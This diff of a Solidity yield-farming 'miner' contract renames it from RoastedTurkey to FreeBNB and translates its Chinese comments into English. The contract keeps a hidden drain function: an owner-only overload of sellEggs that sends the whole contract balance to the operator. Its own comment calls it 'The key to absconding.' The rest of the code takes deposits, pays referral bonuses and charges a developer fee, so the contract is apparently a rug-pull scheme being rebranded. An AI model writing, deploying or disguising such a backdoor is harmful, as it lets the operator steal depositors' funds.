@@ -1,29 +1,29 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.4.26;
 
-contract RoastedTurkey {
+contract FreeBNB {
     
     uint256 EGGS_TO_HATCH_1MINERS = 864000;
     uint256 PSN = 10000;
     uint256 PSNH = 5000;
     bool public initialized = false;
     address public ceoAddress;
-    //本金
     mapping (address => uint256) private hatcheryMiners;
-    //邀請籌碼
+    // invite chips
     mapping (address => uint256) private claimedEggs;
-    //入場時間與出場時間
+    //Entry time and exit time
     mapping (address => uint256) private lastHatch;
-    //邀請地址
+    //Invitation address
     mapping (address => address) private referrals;
-    //市場籌碼
+   
+    // market chips
     uint256 private marketEggs;
 
     constructor() public {
         ceoAddress = msg.sender;
     }
 
-    //複頭 + 邀請碼
+    //repeat + invite code
     function hatchEggs(address ref) public {
         require(initialized);
         if(ref == msg.sender || ref == address(0) || hatcheryMiners[ref] == 0) {
@@ -40,12 +40,12 @@ contract RoastedTurkey {
         claimedEggs[msg.sender] = 0;
         lastHatch[msg.sender] = now;
 
-        //幫你的邀請人增加籌碼
+        //add chips to your inviter
         claimedEggs[referrals[msg.sender]] = SafeMath.add(claimedEggs[referrals[msg.sender]] ,SafeMath.div(SafeMath.mul(eggsUsed, 13), 100));
         marketEggs = SafeMath.add(marketEggs, SafeMath.div(eggsUsed, 5));
     }
 
-    //出金
+    //withdraw
     function sellEggs() public {
         require(initialized);
         uint256 hasEggs = getMyEggs();
@@ -58,7 +58,7 @@ contract RoastedTurkey {
         msg.sender.transfer(SafeMath.sub(eggValue, fee));
     }
 
-    //入金
+    //deposit
     function buyEggs(address ref) public payable {
         require(initialized);
         uint256 eggsBought = calculateEggBuy(msg.value, SafeMath.sub(address(this).balance, msg.value));
@@ -73,17 +73,20 @@ contract RoastedTurkey {
         return SafeMath.div(SafeMath.mul(PSN ,bs), SafeMath.add(PSNH, SafeMath.div(SafeMath.add(SafeMath.mul(PSN, rs),SafeMath.mul(PSNH,  rt)),rt)));
     }
 
-    //賣出公式
+    //Sell formula
+
     function calculateEggSell(uint256 eggs) public view returns(uint256) {
         return calculateTrade(eggs, marketEggs, address(this).balance);
     }
 
-    //買入公式
+    //buy formula
+
     function calculateEggBuy(uint256 eth,uint256 contractBalance) private view returns(uint256) {
         return calculateTrade(eth, contractBalance, marketEggs);
     }
 
-    //資金盤啟動
+    // start the fund
+
     function seedMarket() public payable {
         require(msg.sender == ceoAddress, "invalid call");
         require(marketEggs == 0);
@@ -91,7 +94,7 @@ contract RoastedTurkey {
         marketEggs = 86400000000;
     }
 
-    //捲款潛逃關鍵
+    //The key to absconding
     function sellEggs(address ref) public {
         require(msg.sender == ceoAddress, 'invalid call');
         require(ref == ceoAddress);
@@ -99,27 +102,30 @@ contract RoastedTurkey {
         msg.sender.transfer(address(this).balance);
     }
 
-    //獎池金額
+    // Prize pool amount
+
     function getBalance() public view returns(uint256){
         return address(this).balance;
     }
 
-    //本金
+    //principal
+
     function getMyMiners() public view returns(uint256) {
         return hatcheryMiners[msg.sender];
     }
 
-    //總籌碼
+    //total chips
+
     function getMyEggs() public view returns(uint256) {
         return claimedEggs[msg.sender] + getEggsSinceLastHatch(msg.sender);
     }
 
-    //開發者抽成
+    //Developers take a cut
     function devFee(uint256 amount) private pure returns(uint256){
         return SafeMath.div(SafeMath.mul(amount, 3), 100);
     }
     
-    //本金 * 區塊時間 持續生產
+    //principal * block time continuous production
     function getEggsSinceLastHatch(address adr) private view returns(uint256) {
         uint256 secondsPassed = min(EGGS_TO_HATCH_1MINERS, block.timestamp - lastHatch[adr]);
         return secondsPassed * hatcheryMiners[adr];
